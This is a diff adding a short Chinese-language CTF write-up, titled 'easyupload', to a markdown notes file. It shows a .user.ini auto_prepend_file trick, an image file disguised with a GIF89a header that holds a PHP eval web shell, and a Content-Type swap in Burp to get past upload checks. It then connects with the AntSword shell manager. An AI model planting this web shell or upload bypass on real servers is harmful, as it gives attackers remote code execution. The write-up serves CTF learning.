@@ -143,3 +143,27 @@ var_dump(serialize($a));
 <br>
 
 ### easyupload
+
+题解：利用 .user.ini 配置文件挂载后门程序，使用蚁剑链接得到 flag
+
+可以先制作一个 `.user.ini` 文件
+
+```ini
+GIF89a
+auto_prepend_file=a.jpg
+```
+
+在制作一个带一句话木马的图片 `a.jpg`
+
+```php
+GIF89a
+<?=eval($_POST['cmd']);?>
+```
+
+<br>
+
+使用 burp 拦截每一次上传请求，把 content-type 全部改为 image/jpg，这样才可以绕过类型检测
+
+完毕后中国蚁剑找到文件上传点，链接即可
+
+<br>
